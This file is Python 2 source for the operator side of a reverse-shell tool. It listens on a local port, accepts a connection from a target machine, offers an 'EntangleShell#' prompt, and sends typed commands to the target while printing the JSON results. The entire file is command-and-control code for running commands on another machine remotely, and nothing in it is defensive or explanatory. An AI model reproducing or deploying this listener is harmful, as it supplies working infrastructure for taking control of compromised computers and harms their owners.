import socket
import json

def send(data):
    json_data = json.dumps(data)
    target.send(json_data)

def receive():
    data = ""
    while True:
        try:
            data = data + target.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = raw_input("EntangleShell# ")
        target.send(command)
        if command == 'q':
            break
        else:
            result = receive()
            print(result)

def server():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 1526))
    s.listen(5)
    print("[+] Listening for incoming Connection")
    target, ip = s.accept()
    print("[+] Connection Established From: %s" % str(ip))

server()
shell()
